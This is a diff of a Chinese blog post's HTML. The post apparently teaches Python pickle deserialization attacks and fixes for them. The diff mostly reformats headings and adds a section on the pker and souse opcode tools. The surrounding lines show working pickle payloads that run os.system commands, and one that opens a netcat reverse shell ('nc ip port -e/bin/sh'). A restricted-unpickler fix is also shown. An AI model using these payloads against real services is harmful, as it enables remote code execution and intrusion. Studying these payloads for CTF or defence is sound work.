@@ -38,6 +38,8 @@
 <meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-6.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-7.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-8.png">
+<meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-16.png">
+<meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-17.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-9.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-10.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-11.png">
@@ -46,7 +48,7 @@
 <meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-14.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/python_unserialize-15.png">
 <meta property="article:published_time" content="2024-01-01T01:00:00.000Z">
-<meta property="article:modified_time" content="2024-04-27T14:04:54.219Z">
+<meta property="article:modified_time" content="2026-05-12T07:07:04.439Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="python">
 <meta property="article:tag" content="反序列化">
@@ -447,7 +449,7 @@
         
         
         
-          271 分钟
+          272 分钟
         
       </span>
     
@@ -632,7 +634,8 @@
 <p>与php反序列化中的<code>$this-&gt;b = &amp;$this-&gt;a;</code>引用绕过类似，只不过python用的是import</p>
 </blockquote>
 <h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>pickle中用来构造函数执行的字节码有四个个：<code>R</code>、<code>i</code>、<code>o</code>以及<code>b +__setstate__()</code></p>
-<h3 id="R"><a href="#R" class="headerlink" title="R"></a>R</h3><p><a href="#a">上文</a>中提到的例子用的就是<code>R</code>来实现Rce</p>
+<p><strong>R</strong></p>
+<p><a href="#a">上文</a>中提到的例子用的就是<code>R</code>来实现Rce</p>
 <blockquote>
 <p>R: 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈</p>
 </blockquote>
@@ -641,7 +644,8 @@
 
 
 
-<h3 id="i"><a href="#i" class="headerlink" title="i"></a>i</h3><blockquote>
+<p><strong>i</strong></p>
+<blockquote>
 <p>相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_inst</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 前三行代码与c的代码一致，用来调用</span><br>    module = <span class="hljs-variable language_">self</span>.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    name = <span class="hljs-variable language_">self</span>.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    klass = <span class="hljs-variable language_">self</span>.find_class(module, name)<br>    <span class="hljs-comment"># 通过pop_mark()函数得到参数，利用_instantiate函数执行，将结果存入栈中</span><br>    <span class="hljs-variable language_">self</span>._instantiate(klass, <span class="hljs-variable language_">self</span>.pop_mark())<br>dispatch[INST[<span class="hljs-number">0</span>]] = load_inst<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_instantiate</span>(<span class="hljs-params">self, klass, args</span>):<br>    <span class="hljs-keyword">if</span> (args <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(klass, <span class="hljs-built_in">type</span>) <span class="hljs-keyword">or</span><br>        <span class="hljs-built_in">hasattr</span>(klass, <span class="hljs-string">&quot;__getinitargs__&quot;</span>)):<br>        <span class="hljs-keyword">try</span>:<br>            value = klass(*args)<br>        <span class="hljs-keyword">except</span> TypeError <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;in constructor for %s: %s&quot;</span> %<br>                            (klass.__name__, <span class="hljs-built_in">str</span>(err)), sys.exc_info()[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">else</span>:<br>        value = klass.__new__(klass)<br>    <span class="hljs-variable language_">self</span>.append(value)<br></code></pre></td></tr></table></figure>
@@ -649,7 +653,8 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="o"><a href="#o" class="headerlink" title="o"></a>o</h3><blockquote>
+<p><strong>o</strong></p>
+<blockquote>
 <p>从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_obj</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 弹出栈中所有数据赋值给args</span><br>    args = <span class="hljs-variable language_">self</span>.pop_mark()<br>    <span class="hljs-comment"># 在args中弹出第一个作为类名</span><br>    cls = args.pop(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># 利用_instantiate函数执行并将结果压回栈中</span><br>    <span class="hljs-variable language_">self</span>._instantiate(cls, args)<br>dispatch[OBJ[<span class="hljs-number">0</span>]] = load_obj<br></code></pre></td></tr></table></figure>
@@ -657,7 +662,8 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="b-setstate"><a href="#b-setstate" class="headerlink" title="b + __setstate__()"></a>b + __setstate__()</h3><blockquote>
+<p><strong>b + __setstate__()</strong></p>
+<blockquote>
 <p>使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_build</span>(<span class="hljs-params">self</span>):<br>    stack = <span class="hljs-variable language_">self</span>.stack<br>    <span class="hljs-comment"># 获取栈顶元素</span><br>    state = stack.pop()<br>    <span class="hljs-comment"># 获取栈中倒数第二个元素</span><br>    inst = stack[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 获取倒数第二个元素的__setstate__属性</span><br>    setstate = <span class="hljs-built_in">getattr</span>(inst, <span class="hljs-string">&quot;__setstate__&quot;</span>, <span class="hljs-literal">None</span>)<br><br>    <span class="hljs-comment"># setstate 不为None则调用inst对象的__setstate，将state作为参数传递给它</span><br>    <span class="hljs-comment"># 一般不存在__setstate__方法，setstate(state)会造成任意函数调用</span><br>    <span class="hljs-keyword">if</span> setstate <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        setstate(state)<br>        <span class="hljs-keyword">return</span><br>    slotstate = <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 如果state是元组类型且长度为2，则将其分解成state, slotstate</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:<br>        state, slotstate = state<br><br>    <span class="hljs-keyword">if</span> state:<br>        inst_dict = inst.__dict__<br>        intern = sys.intern<br>        <span class="hljs-comment"># 遍历state字典，将键名赋值给inst_dict，键值直接赋值</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state.items():<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(k) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span>:<br>                inst_dict[intern(k)] = v<br>            <span class="hljs-keyword">else</span>:<br>                inst_dict[k] = v<br><br>    <span class="hljs-keyword">if</span> slotstate:<br>        <span class="hljs-comment"># 遍历slotstate字典，并将其键值对赋值给inst对象</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> slotstate.items():<br>            <span class="hljs-built_in">setattr</span>(inst, k, v)<br>dispatch[BUILD[<span class="hljs-number">0</span>]] = load_build<br></code></pre></td></tr></table></figure>
@@ -673,9 +679,8 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e/bin/sh&#x27;)&quot;</span>,))<br><br>payload = Test()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(payload)))<br></code></pre></td></tr></table></figure>
 
 
-<h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker">pker</a>是由eddieivan01编写的以遍历Python AST的形式来自动化解析pickle opcode的工具。</p>
-</blockquote>
+
+
 <h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复 "></a>漏洞修复 <a id="b"></h1><p>对于pickle反序列化漏洞，常见的修复方法是重写Unpickler.find_class()来限制全局变量</p>
 <p>例如：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-comment"># 需要限制反序列化对象时可以使用的类</span><br>safe_builtins = &#123;<br>    <span class="hljs-string">&#x27;range&#x27;</span>,        <span class="hljs-comment"># range类型</span><br>    <span class="hljs-string">&#x27;complex&#x27;</span>,      <span class="hljs-comment"># 复数类型</span><br>    <span class="hljs-string">&#x27;set&#x27;</span>,          <span class="hljs-comment"># 集合类型</span><br>    <span class="hljs-string">&#x27;frozenset&#x27;</span>,    <span class="hljs-comment"># 冻结集合类型</span><br>    <span class="hljs-string">&#x27;slice&#x27;</span>,        <span class="hljs-comment"># 切片类型</span><br>&#125;<br><br><span class="hljs-comment"># 定义RestrictedUnpickler类继承自pickle.Unpickler</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-comment">#重写了find_class方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># 如果被反序列化的对象的类属于builtins模块中的安全类，则返回该类</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># 如果不是安全类，就抛出异常，禁止反序列化</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><span class="hljs-comment"># 定义一个帮助函数restricted_loads来反序列化对象</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-comment"># 将传入的字符串s转换为bytes，并使用RestrictedUnpickler类反序列化</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br>opcode=<span class="hljs-string">b&quot;cos\nsystem\n(S&#x27;echo hello world&#x27;\ntR.&quot;</span><br>restricted_loads(opcode)<br><br><br><span class="hljs-comment">###结果如下</span><br>Traceback (most recent call last):<br>...<br>_pickle.UnpicklingError: <span class="hljs-keyword">global</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">is</span> forbidden<br></code></pre></td></tr></table></figure>
@@ -753,6 +758,11 @@
 
 <h2 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h2><p>有时可以通过改变opcode的版本来绕过一些对字母的过滤</p>
 <p><img src="/img/summary/python_unserialize-8.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="python-源码转换工具"><a href="#python-源码转换工具" class="headerlink" title="python 源码转换工具"></a>python 源码转换工具</h1><p><a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker">pker</a> 是基于 AST 的单文件结构<br><a target="_blank" rel="noopener" href="https://github.com/Macr0phag3/souse">souse</a> 比较综合，还支持 bypass 和 explain</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1.py</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> system<br><br>system(<span class="hljs-string">&quot;type flag.txt&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/summary/python_unserialize-16.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/summary/python_unserialize-17.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="PyYAML-反序列化"><a href="#PyYAML-反序列化" class="headerlink" title="PyYAML 反序列化"></a>PyYAML 反序列化</h1><h2 id="基础语法规则"><a href="#基础语法规则" class="headerlink" title="基础语法规则"></a>基础语法规则</h2><p>1：大小写敏感</p>
 <p>2：使用空格代替tab键缩进表示层级，对齐即可表示同级</p>
 <p>3：和python一样使用’#’注释内容</p>
@@ -961,7 +971,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年4月27日</div>
+          <div>2026年5月12日</div>
         </div>
       
       
